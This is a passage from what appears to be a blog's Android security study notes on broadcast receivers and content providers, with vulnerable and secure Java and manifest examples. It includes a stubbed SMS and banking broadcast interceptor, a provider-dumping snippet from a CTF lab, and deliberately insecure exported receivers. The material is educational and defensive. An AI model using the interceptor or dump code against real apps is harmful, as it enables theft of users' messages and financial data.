receivers “at the same time”. This basically means that one receiver can not interfere in any way with what other receivers will do neither can it prevent other receivers from being executed. One example of such broadcast is the ACTION_BATTERY_LOW one.\nIn ordered mode, broadcasts are sent to each receiver in order (controlled by the android:priority attribute for the intent-filter element in the manifest file that is related to your receiver) and one receiver is able to abort the broadcast so that receivers with a lower priority would not receive it (thus never execute). An example of this type of broadcast (and one that will be discussing in this document) is the ACTION_NEW_OUTGOING_CALL one.\nVarious action types #\r1. System-Wide Events #\rUse Case: React to system or device state changes.\nImportance: Critical for apps that depend on device state (e.g., network, boot, user sessions).\nActions You Can Listen For: #\rNetwork Connectivity Changes Importance: High Use Case: Sync data when network is restored. Boot Completion (BOOT_COMPLETED) Importance: High Use Case: Start background services on device reboot. Package Installation/Removal (PACKAGE_ADDED, PACKAGE_REMOVED) Importance: Medium Use Case: Detect app installs (e.g., security apps). Screen Lock/Unlock Importance: Medium Use Case: Security apps (e.g., auto-lock on screen off). Password Events (ACTION_PASSWORD_FAILED, ACTION_PASSWORD_SUCCEEDED) Importance: Medium Use Case: Security logging. Device Admin Events (DEVICE_ADMIN_ENABLED, DEVICE_ADMIN_DISABLED) Importance: High (for MDM/EMM apps) Use Case: Enterprise device management. User Session Events (USER_SWITCHED, USER_REMOVED) Importance: High (for multi-user apps) Use Case: Profile-specific data loading. 2. NFC Events #\rUse Case: NFC-based interactions (payments, tags, card emulation).\nImportance: Critical for NFC apps, irrelevant for others.\nActions You Can Listen For: #\rTag Discovery (ACTION_NDEF_DISCOVERED, ACTION_TAG_DISCOVERED) Importance: High (for NFC apps) Use Case: Read/write NFC tags. RF Field Detection (RF_FIELD_ON_DETECTED) Importance: Medium Use Case: Detect NFC field presence. APDU/Applet Selection (APDU_RECEIVED, AID_SELECTED) Importance: High (for payment apps) Use Case: Host Card Emulation (HCE). 3. Application-Specific Broadcasts #\rUse Case: Inter-app communication or background task coordination.\nImportance: Depends on app requirements.\nActions You Can Create: #\rCustom Broadcasts (e.g., com.example.APP_DATA_UPDATED) Importance: Medium Use Case: Notify other components of data changes. Pending Intents for Notifications Importance: High Use Case: Handle notification clicks. Permission-Protected Broadcasts Importance: High (for security) Use Case: Restrict broadcasts to trusted apps. 4. Content Provider Interactions #\rUse Case: Access/modify shared data (contacts, media, etc.).\nImportance: High if your app integrates with system data.\nActions You Can Perform: #\rQuery/Modify Contacts/Calendar/Media Importance: High (for productivity apps) Use Case: Sync user contacts. Grant Temporary URI Permissions Importance: Medium Use Case: Share file access securely. Changes across android version #\rAndroid 16 (Future) #\rBroadcast Priority Changes: The android:priority attribute or IntentFilter.setPriority() no longer guarantees order across different processes. Priorities are only enforced within the same app process. Priority range is restricted to (SYSTEM_LOW_PRIORITY + 1, SYSTEM_HIGH_PRIORITY - 1). Only system components can use SYSTEM_LOW_PRIORITY/SYSTEM_HIGH_PRIORITY. Android 14 #\rCached State Optimization: System defers non-critical broadcasts (e.g., ACTION_SCREEN_ON) for apps in a cached state. Apps are temporarily revived from cached state for manifest-declared important broadcasts. Android 9 (API 28) #\rWi-Fi Broadcast Restrictions: NETWORK_STATE_CHANGED_ACTION no longer leaks location/PII data. SSIDs, BSSIDs, and scan results are excluded from broadcasts. Use WifiManager.getConnectionInfo() instead. Android 8.0 (API 26) #\rImplicit Broadcast Ban: Apps cannot register manifest receivers for most implicit broadcasts (e.g., system-wide events). Exceptions: Broadcasts targeting the app explicitly (via package name). Broadcasts in the allowlist. Workaround: Use context-registered receivers (active app only). Android 7.0 (API 24) #\rRemoved Broadcasts: ACTION_NEW_PICTURE and ACTION_NEW_VIDEO are no longer sent. Connectivity Changes: CONNECTIVITY_ACTION must use dynamic registration (registerReceiver()). Manifest declarations do not work. Security Consideration #\r1. Prefer Context-Registered Receivers #\rIssue: Manifest-declared receivers can cause multiple app launches, hurting performance. Solution: Use Context.registerReceiver() instead where possible (e.g., CONNECTIVITY_ACTION requires it). 2. Protect Broadcasts #\rAvoid Implicit Intents:\nSensitive data in implicit broadcasts can be read by any app. Solutions: Restrict with Permissions: // Sender side (require permission) sendBroadcast(intent, \u0026#34;com.example.PERMISSION\u0026#34;); // Receiver side (declare permission) \u0026lt;uses-permission android:name=\u0026#34;com.example.PERMISSION\u0026#34; /\u0026gt; Limit Scope with setPackage() (API 14+): intent.setPackage(\u0026#34;com.example.myapp\u0026#34;); // Only your app receives it Receiver Security:\nFor manifest-declared receivers, set android:exported=\u0026quot;false\u0026quot; if only internal use. For dynamic receivers, use: // Android 12+: Block external apps ContextCompat.registerReceiver(..., ContextCompat.RECEIVER_NOT_EXPORTED); 3. Unique Action Names #\rUse a custom namespace (e.g., com.example.ACTION_DATA_UPDATE) to avoid conflicts with other apps. 4. Handle onReceive() Carefully #\rMain Thread Limitation: Runs on UI thread—keep it short (\u0026lt;10 seconds). Solutions for Long Tasks: goAsync(): Briefly extend broadcast lifecycle: public void onReceive(Context context, Intent intent) { final PendingResult result = goAsync(); new Thread(() -\u0026gt; { // Background work result.finish(); }).start(); } JobScheduler/WorkManager: For heavy work. 5. Avoid Launching Activities #\rWhy: Multiple receivers could spam the user with activities. Alternative: Show a notification instead. Key Takeaways #\rRisk Solution Too many app launches Use context-registered receivers. Data leaks Use permissions or setPackage(). Malicious broadcasts Set RECEIVER_NOT_EXPORTED or android:exported=\u0026quot;false\u0026quot;. Slow onReceive() Use goAsync() or JobScheduler. Conflicting actions Prefix broadcasts with your app\u0026rsquo;s namespace. For modern apps: Dynamic receivers + permissions + JobScheduler is the safest combo.\nWidget #\rWidgets are a cool feature allowing apps to create small user interfaces that get directly embedded on the home screen. This means the widgets are actually running within another app!\nThe AppWidgetProvider is actually a wrapper around BroadcastReceiver to update the widget data in the background. It can also handle interactions with the widget such as button presses. But because the widget is running inside the home screen, broadcast PendingIntents are used to handle the button presses.\nImagine if app \u0026ldquo;Z\u0026rdquo; has a widget that when clicked open an activity in app Z now since the widget is in the home screen (another app) so we want to broadcast to our app with our Z permissions ? so we use pending intent that handles that for us\nNotifications can be easily created using the notification builder. Inside of notifications you can also add button actions by preparing a PendingIntent. The reason for that is because the notification is again handled by a different app.\nCommon Vulnerabilities #\r1. Unintentionally Exported Receivers #\rVulnerability #\rDefault exported state: If a receiver includes at least one intent filter, the android:exported attribute defaults to true if not explicitly set to false Missing access control: No validation of sender or data Sensitive operations exposed: Critical operations accessible to any malicious app Vulnerable Code Example #\r\u0026lt;!-- AndroidManifest.xml --\u0026gt; \u0026lt;!-- VULNERABLE: Exported by default due to intent filter --\u0026gt; \u0026lt;receiver android:name=\u0026#34;.VulnerableReceiver\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;com.example.SENSITIVE_ACTION\u0026#34; /\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/receiver\u0026gt; public class VulnerableReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { // VULNERABLE: No validation of sender or data String sensitiveData = intent.getStringExtra(\u0026#34;user_token\u0026#34;); String userCredentials = intent.getStringExtra(\u0026#34;credentials\u0026#34;); // This sensitive data can be accessed by any malicious app Log.d(\u0026#34;VulnerableReceiver\u0026#34;, \u0026#34;Token: \u0026#34; + sensitiveData); // VULNERABLE: Performing sensitive actions without verification if (\u0026#34;com.example.SENSITIVE_ACTION\u0026#34;.equals(intent.getAction())) { // Delete user data or perform privileged operations deleteUserData(context); transferMoney(intent.getStringExtra(\u0026#34;amount\u0026#34;)); } } private void deleteUserData(Context context) { // Sensitive operation that can be triggered by any app } private void transferMoney(String amount) { // Critical operation exposed to any malicious app } } 2. Insecure Dynamic Registration #\rVulnerability #\rPublic by default: Dynamically registered receivers are public by default No protection: Lacks permission-based access control Runtime exposure: Creates attack surface during app execution Vulnerable Code Example #\rpublic class VulnerableActivity extends Activity { private BroadcastReceiver dynamicReceiver; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); // VULNERABLE: Dynamic receiver is public by default dynamicReceiver = new BroadcastReceiver() { @Override public void onReceive(Context context, Intent intent) { // Any app can send broadcasts to this receiver String sensitiveCommand = intent.getStringExtra(\u0026#34;command\u0026#34;); executeSensitiveCommand(sensitiveCommand); } }; // VULNERABLE: No protection for dynamic registration IntentFilter filter = new IntentFilter(\u0026#34;com.example.DYNAMIC_ACTION\u0026#34;); registerReceiver(dynamicReceiver, filter); } private void executeSensitiveCommand(String command) { // Vulnerable to command injection } } 3. Sensitive Data in Implicit Intents #\rVulnerability #\rBroadcast interception: Any app can register matching intent filters Data exposure: Sensitive information transmitted in clear text Wide delivery: Implicit broadcasts delivered to all matching receivers Vulnerable Code Example #\rpublic class VulnerableDataSender extends Activity { public void sendSensitiveData() { Intent intent = new Intent(); intent.setAction(\u0026#34;com.example.SHARE_DATA\u0026#34;); // VULNERABLE: Sensitive data in implicit intent intent.putExtra(\u0026#34;session_token\u0026#34;, \u0026#34;abc123xyz789\u0026#34;); intent.putExtra(\u0026#34;user_id\u0026#34;, \u0026#34;12345\u0026#34;); intent.putExtra(\u0026#34;credit_card\u0026#34;, \u0026#34;4111-1111-1111-1111\u0026#34;); // This broadcast can be intercepted by any malicious app sendBroadcast(intent); } } 4. Message Interception Attacks #\rVulnerability #\rBroadcast hijacking: Malicious apps register for same intent actions Data theft: Sensitive information extracted from intercepted broadcasts System mimicry: Attackers can mimic legitimate system events Malicious Code Example #\rpublic class MaliciousInterceptor extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { // Malicious app intercepts SMS or other sensitive broadcasts if (\u0026#34;android.provider.Telephony.SMS_RECEIVED\u0026#34;.equals(intent.getAction())) { // Extract and steal SMS data Bundle bundle = intent.getExtras(); // Send stolen data to attacker\u0026#39;s server sendToAttackerServer(bundle); } // Intercept app-specific sensitive broadcasts if (\u0026#34;com.banking.app.TRANSACTION_COMPLETE\u0026#34;.equals(intent.getAction())) { String amount = intent.getStringExtra(\u0026#34;amount\u0026#34;); String account = intent.getStringExtra(\u0026#34;account\u0026#34;); // Steal financial information stealFinancialData(amount, account); } } private void sendToAttackerServer(Bundle data) { // Malicious network request } private void stealFinancialData(String amount, String account) { // Exfiltrate sensitive financial data } } Best Practices and Secure Implementation #\r1. Explicitly Disable Export for Internal Receivers #\rImplementation #\r\u0026lt;!-- AndroidManifest.xml --\u0026gt; \u0026lt;!-- SECURE: Explicitly set exported to false --\u0026gt; \u0026lt;receiver android:name=\u0026#34;.InternalReceiver\u0026#34; android:exported=\u0026#34;false\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;com.example.INTERNAL_ACTION\u0026#34; /\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/receiver\u0026gt; public class SecureReceiver extends BroadcastReceiver { private static final String EXPECTED_SIGNATURE = \u0026#34;expected_app_signature\u0026#34;; @Override public void onReceive(Context context, Intent intent) { // SECURE: Validate the sender if (!isValidSender(context)) { Log.w(\u0026#34;SecureReceiver\u0026#34;, \u0026#34;Unauthorized sender blocked\u0026#34;); return; } // SECURE: Validate and sanitize input data String action = intent.getAction(); if (!isValidAction(action)) { Log.w(\u0026#34;SecureReceiver\u0026#34;, \u0026#34;Invalid action blocked: \u0026#34; + action); return; } // SECURE: Sanitize input parameters String userInput = sanitizeInput(intent.getStringExtra(\u0026#34;user_input\u0026#34;)); if (\u0026#34;com.example.INTERNAL_ACTION\u0026#34;.equals(action)) { // Safe to process since sender is validated processSecureAction(context, userInput); } } private boolean isValidSender(Context context) { // Verify sender\u0026#39;s signature or package name try { PackageManager pm = context.getPackageManager(); PackageInfo senderInfo = pm.getPackageInfo(getSenderPackage(), PackageManager.GET_SIGNATURES); // Verify signature matches expected return verifySignature(senderInfo.signatures); } catch (PackageManager.NameNotFoundException e) { return false; } } private boolean verifySignature(Signature[] signatures) { // Implementation to verify app signature return true; // Simplified } private String getSenderPackage() { // Get sender package name (implementation depends on context) return \u0026#34;com.trusted.sender\u0026#34;; } private boolean isValidAction(String action) { // Whitelist of allowed actions return action != null \u0026amp;\u0026amp; action.startsWith(\u0026#34;com.example.\u0026#34;); } private String sanitizeInput(String input) { if (input == null) return null; // Remove potentially dangerous characters return input.replaceAll(\u0026#34;[\u0026lt;\u0026gt;\\\u0026#34;\u0026#39;\u0026amp;]\u0026#34;, \u0026#34;\u0026#34;).trim(); } private void processSecureAction(Context context, String input) { // Safe processing of validated input } } 2. Secure Dynamic Registration with Permissions #\rImplementation #\r\u0026lt;!-- AndroidManifest.xml --\u0026gt; \u0026lt;!-- Define custom signature-level permission --\u0026gt; \u0026lt;permission android:name=\u0026#34;com.example.CUSTOM_PERMISSION\u0026#34; android:protectionLevel=\u0026#34;signature\u0026#34; /\u0026gt; public class SecureActivity extends Activity { private BroadcastReceiver secureReceiver; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); secureReceiver = new BroadcastReceiver() { @Override public void onReceive(Context context, Intent intent) { // Process only validated and sanitized data processSecureData(context, intent); } }; // SECURE: Register with permission protection IntentFilter filter = new IntentFilter(\u0026#34;com.example.SECURE_ACTION\u0026#34;); registerReceiver(secureReceiver, filter, \u0026#34;com.example.CUSTOM_PERMISSION\u0026#34;, null); } private void processSecureData(Context context, Intent intent) { // Secure processing with validation } @Override protected void onDestroy() { super.onDestroy(); // Always unregister dynamic receivers if (secureReceiver != null) { unregisterReceiver(secureReceiver); } } } 3. Use LocalBroadcastManager for Internal Communication #\rImplementation #\rpublic class SecureInternalCommunication extends Activity { private LocalBroadcastManager localBroadcastManager; private BroadcastReceiver localReceiver; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); localBroadcastManager = LocalBroadcastManager.getInstance(this); // SECURE: Local receiver only receives broadcasts from same app localReceiver = new BroadcastReceiver() { @Override public void onReceive(Context context, Intent intent) { // Safe to process - sender is guaranteed to be same app String sensitiveData = intent.getStringExtra(\u0026#34;internal_data\u0026#34;); processSensitiveData(sensitiveData); } }; IntentFilter filter = new IntentFilter(\u0026#34;com.example.INTERNAL_BROADCAST\u0026#34;); localBroadcastManager.registerReceiver(localReceiver, filter); } public void sendSecureInternalBroadcast() { Intent intent = new Intent(\u0026#34;com.example.INTERNAL_BROADCAST\u0026#34;); intent.putExtra(\u0026#34;internal_data\u0026#34;, \u0026#34;sensitive_information\u0026#34;); // SECURE: Broadcast stays within the app localBroadcastManager.sendBroadcast(intent); } private void processSensitiveData(String data) { // Safe processing of internal data } @Override protected void onDestroy() { super.onDestroy(); if (localReceiver != null) { localBroadcastManager.unregisterReceiver(localReceiver); } } } 4. Use Explicit Intents and Callbacks #\rImplementation #\rpublic class SecureDataSender extends Activity { public void sendDataSecurely() { // SECURE: Use explicit intent to specific receiver Intent intent = new Intent(this, SpecificReceiver.class); intent.setAction(\u0026#34;com.example.SECURE_ACTION\u0026#34;); // Safe to include sensitive data in explicit intent intent.putExtra(\u0026#34;session_token\u0026#34;, \u0026#34;abc123xyz789\u0026#34;); intent.putExtra(\u0026#34;user_id\u0026#34;, \u0026#34;12345\u0026#34;); // Send to specific component only sendBroadcast(intent); } public void useCallbackInstead() { // SECURE: Better approach - use callback instead of broadcast performAsyncOperation(new AsyncCallback() { @Override public void onComplete(String result) { // Handle completion securely processSensitiveResult(result); } @Override public void onError(String error) { // Handle error securely handleError(error); } }); } private void performAsyncOperation(AsyncCallback callback) { // Perform operation and call callback } private void processSensitiveResult(String result) { // Process sensitive result } private void handleError(String error) { // Handle error } interface AsyncCallback { void onComplete(String result); void onError(String error); } } 5. Comprehensive Input Validation #\rImplementation #\rpublic class ValidatingReceiver extends BroadcastReceiver { private static final int MAX_INPUT_LENGTH = 256; private static final Pattern SAFE_PATTERN = Pattern.compile(\u0026#34;^[a-zA-Z0-9\\\\s-_]+$\u0026#34;); @Override public void onReceive(Context context, Intent intent) { try { // SECURE: Comprehensive input validation if (!validateIntentStructure(intent)) { Log.w(\u0026#34;ValidatingReceiver\u0026#34;, \u0026#34;Invalid intent structure\u0026#34;); return; } String userInput = intent.getStringExtra(\u0026#34;user_input\u0026#34;); if (!isValidInput(userInput)) { Log.w(\u0026#34;ValidatingReceiver\u0026#34;, \u0026#34;Invalid input blocked\u0026#34;); return; } // Process validated input processValidatedInput(context, userInput); } catch (Exception e) { Log.e(\u0026#34;ValidatingReceiver\u0026#34;, \u0026#34;Error processing broadcast\u0026#34;, e); // Fail securely - don\u0026#39;t expose error details } } private boolean validateIntentStructure(Intent intent) { // Validate intent has expected structure return intent != null \u0026amp;\u0026amp; intent.getAction() != null \u0026amp;\u0026amp; intent.getAction().startsWith(\u0026#34;com.example.\u0026#34;); } private boolean isValidInput(String input) { if (input == null || input.isEmpty()) { return false; } // Length validation if (input.length() \u0026gt; MAX_INPUT_LENGTH) { return false; } // Pattern validation return SAFE_PATTERN.matcher(input).matches(); } private void processValidatedInput(Context context, String input) { // Safe to process validated input Log.d(\u0026#34;ValidatingReceiver\u0026#34;, \u0026#34;Processing: \u0026#34; + input); } } Resources #\rBroadcast Receiver in Android With Example Docs Broadcast Implicit broadcast exceptions ","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/posts/summary/broadcast/","section":"","summary":"","title":"Broadcast","type":"posts"},{"content":"\rSummary #\rA way to manage access to data and make sharing this data with other applications easier. Think of it like having notes saved in one app (A) that you want other apps (B,C,D etc\u0026hellip;) to access - but they\u0026rsquo;re saved locally so Android will deny access for any other app. OK Simple, just call the provider and it will provide it for us! 😄\nThey are designed to manage access to data and Makes sharing this data with other applications easier. They encapsulate the data and act as an interface connecting data in one process with code running in another process, Each row represents an instance of data, and each column represents an individual piece of data for that instance\n[!INFO] Who can access Content Providers?\nYour own app components - Activities, Services, Broadcast Receivers Other applications - If properly configured with permissions System apps - Android framework components like sync adapters Widgets - Home screen widgets that need app data Third-party apps - With appropriate permissions and export settings What is a File Provider? #\rA \u0026ldquo;file provider\u0026rdquo; is not a separate Android component. Instead, It\u0026rsquo;s a Content Provider that is specifically designed and configured to manage and share file-based data.\nWhat Content Providers Look Like #\rCore Components #\r1. Provider Client (ContentResolver) #\rAccessing data from a content provider\nWhen an application wants to access data in a content provider, it uses the ContentResolver object available in its Context. The ContentResolver communicates with the provider object, performs the requested action, and returns results.\nBasic CRUD Operations:\n// Get ContentResolver ContentResolver resolver = getContentResolver(); // Query data Cursor cursor = resolver.query( uri, // Content URI projection, // Columns to return selection, // WHERE clause selectionArgs, // WHERE clause arguments sortOrder // Sort order ); // Insert data ContentValues values = new ContentValues(); values.put(\u0026#34;column_name\u0026#34;, \u0026#34;value\u0026#34;); Uri newUri = resolver.insert(uri, values); // Update data int rowsUpdated = resolver.update(uri, values, selection, selectionArgs); // Delete data int rowsDeleted = resolver.delete(uri, selection, selectionArgs); Bonus query code #\rThis will return all data that the uri can access in database\nCursor cursor = getContentResolver().query( Uri.parse(\u0026#34;content://io.hextree.flag30/success\u0026#34;), null, null, null, null ); // dump Uri if (cursor!=null \u0026amp;\u0026amp; cursor.moveToFirst()) { do { StringBuilder sb = new StringBuilder(); for (int i = 0; i \u0026lt; cursor.getColumnCount(); i++) { if (sb.length() \u0026gt; 0) { sb.append(\u0026#34;, \u0026#34;); } sb.append(cursor.getColumnName(i) + \u0026#34; = \u0026#34; + cursor.getString(i)); } Log.d(\u0026#34;evil\u0026#34;, sb.toString()); } while (cursor.moveToNext()); } 2. Provider (ContentProvider subclass) #\rThe actual implementation that manages access to data\npublic class MyContentProvider extends ContentProvider { @Override public boolean onCreate() { // Initialize provider (keep it fast!) return true; } @Override public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) { // Return data based on query return cursor; } @Override public Uri insert(Uri uri, ContentValues values) { // Insert new data and return URI return newUri; } @Override public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) { // Update existing data return rowsAffected; } @Override public int delete(Uri uri, String selection, String[] selectionArgs) { // Delete data return rowsDeleted; } @Override public String getType(Uri uri) { // Return MIME type for the URI return mimeType; } } Built-in Content Providers #\rAndroid includes many system content providers including :\nUser Dictionary Provider: Non-standard words for spellcheck Contacts Provider: User contact information MediaStore: Images, videos, audio files on device Calendar Provider: Calendar events and data Creating Custom Content Providers #\r1. Design Data Storage #\rFor structured data:\nDecide storage mechanism (SQLite, files, etc.) Data must have primary key column (often BaseColumns._ID) For file data (unstructured):\nUse file-oriented APIs You can mix and match different storage types and expose them through a single content provider Example of a DB that is prover can query #\rpublic class FlagDatabaseHelper extends SQLiteOpenHelper { public static final String COLUMN_CONTENT = \u0026#34;content\u0026#34;; public static final String COLUMN_ID = \u0026#34;_id\u0026#34;; public static final String COLUMN_NAME = \u0026#34;name\u0026#34;; public static final String COLUMN_TITLE = \u0026#34;title\u0026#34;; public static final String COLUMN_VALUE = \u0026#34;value\u0026#34;; public static final String COLUMN_VISIBLE = \u0026#34;visible\u0026#34;; private static final String CREATE_TABKE_NOTE = \u0026#34;CREATE TABLE Note (_id INTEGER PRIMARY KEY AUTOINCREMENT, title TEXT NOT NULL, content TEXT NOT NULL );\u0026#34;; private static final String CREATE_TABLE_FLAG = \u0026#34;CREATE TABLE Flag (_id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, value TEXT NOT NULL, visible INTEGER NOT NULL DEFAULT 1);\u0026#34;; private static final String DATABASE_NAME = \u0026#34;flag.db\u0026#34;; private static final int DATABASE_VERSION = 1; public static final String TABLE_FLAG = \u0026#34;Flag\u0026#34;; public static final String TABLE_NOTE = \u0026#34;Note\u0026#34;; public FlagDatabaseHelper(Context context) { super(context, DATABASE_NAME, (SQLiteDatabase.CursorFactory) null, 1); } @Override // android.database.sqlite.SQLiteOpenHelper public void onCreate(SQLiteDatabase sQLiteDatabase) { Log.i(\u0026#34;FlagDatabaseHelper\u0026#34;, \u0026#34;database created\u0026#34;); sQLiteDatabase.execSQL(CREATE_TABLE_FLAG); sQLiteDatabase.execSQL(CREATE_TABKE_NOTE); sQLiteDatabase.execSQL(\u0026#34;INSERT INTO Flag (name, value, visible) VALUES (\u0026#39;flag30\u0026#39;, \u0026#39;HXT{censored}\u0026#39;, 1);\u0026#34;); sQLiteDatabase.execSQL(\u0026#34;INSERT INTO Flag (name, value, visible) VALUES (\u0026#39;flag31\u0026#39;, \u0026#39;HXT{censored}\u0026#39;, 1);\u0026#34;); sQLiteDatabase.execSQL(\u0026#34;INSERT INTO Flag (name, value, visible) VALUES (\u0026#39;flag32\u0026#39;, \u0026#39;HXT{censored}\u0026#39;, 0);\u0026#34;); sQLiteDatabase.execSQL(\u0026#34;INSERT INTO Note (title, content) VALUES (\u0026#39;secret\u0026#39;, \u0026#39;This is a secret note\u0026#39;);\u0026#34;); sQLiteDatabase.execSQL(\u0026#34;INSERT INTO Note (title, content) VALUES (\u0026#39;flag33\u0026#39;, \u0026#39;HXT{censored}\u0026#39;);\u0026#34;); } @Override // android.database.sqlite.SQLiteOpenHelper public void onUpgrade(SQLiteDatabase sQLiteDatabase, int i, int i2) { sQLiteDatabase.execSQL(\u0026#34;DROP TABLE IF EXISTS Flag\u0026#34;); onCreate(sQLiteDatabase); } From here we can see names an columns and how many table we have\nDatabase Structure #\rDatabase Name: flag.db\nTables:\nFlag - Stores flag information\nNote - Stores notes (potentially containing additional flags)\nFlag Table Schema #\rColumn Type Description _id INTEGER (PK) Auto-incrementing ID name TEXT Flag name (e.g., flag30, flag31) value TEXT Flag value (e.g., HXT{censored}) visible INTEGER Visibility flag (1 = visible, 0 = hidden) Note Table Schema #\rColumn Type Description _id INTEGER (PK) Auto-incrementing ID title TEXT Note title content TEXT Note content Flag Table (Initial Entries) #\rname value visible flag30 HXT{censored} 1 (visible) flag31 HXT{censored} 1 (visible) flag32 HXT{censored} 0 (hidden) Note Table (Initial Entries) #\rtitle content secret This is a secret note flag33 HXT{censored} 2. Implement ContentProvider #\rCreate subclass implementing six abstract methods:\npublic class CustomProvider extends ContentProvider { // Must be thread-safe (except onCreate) @Override public boolean onCreate() { // Fast initialization only - defer heavy tasks return true; } // Implement CRUD operations... // (See code examples above) } 3. Define Metadata #\rCreate a contract class with constants:\npublic final class ProviderContract { public static final String AUTHORITY = \u0026#34;com.example.provider\u0026#34;; public static final Uri BASE_URI = Uri.parse(\u0026#34;content://\u0026#34; + AUTHORITY); public static final class TableName { public static final Uri URI = Uri.withAppendedPath(BASE_URI, \u0026#34;table\u0026#34;); public static final String COLUMN_ID = \u0026#34;_id\u0026#34;; public static final String COLUMN_NAME = \u0026#34;name\u0026#34;; } } Authority (android:authorities): This is the symbolic name that uniquely identifies your provider within the system. Use reverse internet domain ownership (e.g., com.example.yourapp.provider) to avoid conflicts Content URIs: URIs identify data in your provider. They combine the content:// scheme, the provider\u0026rsquo;s authority, and a path that points to a table or file (e.g., content://user_dictionary/words) Handling Content URI IDs: By convention, content URIs can include an ID value appended to the path (e.g., content://user_dictionary/words/4) to refer to a single row. The UriMatcher class can be used to map URI patterns (using wildcards like * for any string and # for any numeric string) to integer values, allowing you to easily handle different types of URI requests in a switch statement 4. Manifest Registration #\rRegister in AndroidManifest.xml with proper authorities and permissions.\nUse Cases #\r1- Secure Data Sharing #\rThey allow other applications to securely access and modify your app\u0026rsquo;s data with proper permission controls.\n2- Data Abstraction #\rContent providers abstract away the details of underlying data storage. You can change your internal data storage implementation (e.g., from SQLite to files) without affecting other applications.\n3- More Permission Control #\rGreater control over permissions for accessing data:\nRestrict access to only your application Grant blanket permission to other applications Configure different permissions for reading vs writing data 4- Framework Integration #\rSeveral Android classes rely on ContentProvider:\nAbstractThreadedSyncAdapter for server synchronization CursorAdapter and CursorLoader for async UI data loading Custom search suggestions implementation Widget data exposure Complex data copy/paste operations File Provider Implementation #\rHow Content Providers Handle Files #\rWhen a content provider is used to share files, it manages file data such as photos, audio, or videos. Rather than storing large file data directly in a table, it is recommended to store the data in a file (preferably in your application\u0026rsquo;s private space) and then provide indirect access or a handle to that file when requested by another application.\nFor content providers that offer files, you are expected to implement the getStreamTypes() method, which returns a string array of MIME types (e.g., \u0026ldquo;image/jpeg\u0026rdquo;, \u0026ldquo;image/png\u0026rdquo;) for the files your provider can return for a given content URI.\n[!WARNING] External Storage Security If files are stored on external storage, they are typically public and world-readable by default, and a content provider cannot restrict access to them through its own permissions, as other applications can use different API calls to read and write them directly. To ensure control over access to your data, you should store it in internal files, SQLite databases, or cloud storage, and keep these private to your application.\nConfiguration \u0026amp; Permissions #\rManifest Declaration #\r\u0026lt;provider android:name=\u0026#34;.MyContentProvider\u0026#34; android:authorities=\u0026#34;com.example.provider\u0026#34; android:exported=\u0026#34;false\u0026#34; android:permission=\u0026#34;com.example.READ_WRITE_PERMISSION\u0026#34; android:readPermission=\u0026#34;com.example.READ_PERMISSION\u0026#34; android:writePermission=\u0026#34;com.example.WRITE_PERMISSION\u0026#34; android:grantUriPermissions=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;!-- Path-specific permissions --\u0026gt; \u0026lt;path-permission android:path=\u0026#34;/sensitive/*\u0026#34; android:readPermission=\u0026#34;com.example.SENSITIVE_READ\u0026#34; /\u0026gt; \u0026lt;!-- Temporary URI permissions --\u0026gt; \u0026lt;grant-uri-permission android:pathPattern=\u0026#34;/temp/*\u0026#34; /\u0026gt; \u0026lt;/provider\u0026gt; Some Key Attributes #\randroid:exported #\rDefault behavior changed in API 17: Defaults to false if no intent filters If intent filters are defined, defaults to true unless explicitly set to false External calls are blocked by activity manager if not exported (unless calling process is root/system) Permission Levels #\rProvider-level: android:permission (single read/write) android:readPermission / android:writePermission (separate permissions) Separate permissions take precedence over single permission Path-level: \u0026lt;path-permission\u0026gt; child elements Apply to specific content URI paths Take precedence over provider-level permissions Temporary URI Permissions #\rThese grant temporary access to a specific content URI, reducing the need for an app to request permanent permissions in its manifest. Enabled by android:grantUriPermissions=\u0026quot;true\u0026quot; or \u0026lt;grant-uri-permission\u0026gt; Granted via setting intent flags to: FLAG_GRANT_READ_URI_PERMISSION or FLAG_GRANT_WRITE_URI_PERMISSION when sending the content URI to another application. Automatically revoked when receiving activity finishes Data Types and MIME Types #\rSupported Data Types #\rContent providers can manage various data storage sources:\nStructured data (like a SQLite relational database) Unstructured data such as image files, audio, or video media Binary Large Objects (BLOBs) - implemented as byte arrays For file-oriented data (images/videos), store in files and provide indirect access MIME Type Conventions #\r// Standard MIME types for common data \u0026#34;text/html\u0026#34; \u0026#34;image/jpeg\u0026#34; // Android vendor-specific MIME types for table data // Multiple rows \u0026#34;vnd.android.cursor.dir/vnd.com.example.provider.table1\u0026#34; // Single row \u0026#34;vnd.android.cursor.item/vnd.example.line2\u0026#34; // Get MIME type programmatically String mimeType = getContentResolver().getType(uri); Common Vulnerabilities #\r1. Overly open Access Controls #\rVulnerability #\rDefault exported state: Historically public by default (changed in API 17) Missing permissions: No read/write permissions set Inadequate permissions: Generic permissions for sensitive data Vulnerable Code Example #\r// Manifest: AndroidManifest.xml /* \u0026lt;provider android:name=\u0026#34;.MyContentProvider\u0026#34; android:authorities=\u0026#34;com.example.myapp.provider\u0026#34; android:exported=\u0026#34;true\u0026#34; /\u0026gt; */ public class MyContentProvider extends ContentProvider { private DatabaseHelper dbHelper; @Override public boolean onCreate() { dbHelper = new DatabaseHelper(getContext()); return true; } @Override public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) { // Vulnerable: No permission checks, exposes sensitive data to any app SQLiteDatabase db = dbHelper.getReadableDatabase(); return db.query(\u0026#34;sensitive_table\u0026#34;, projection, selection, selectionArgs, null, null, sortOrder); } // Other required methods (insert, update, delete, getType) omitted for brevity } Mitigation #\r\u0026lt;!-- Explicitly set exported and permissions --\u0026gt; \u0026lt;provider android:name=\u0026#34;.MyProvider\u0026#34; 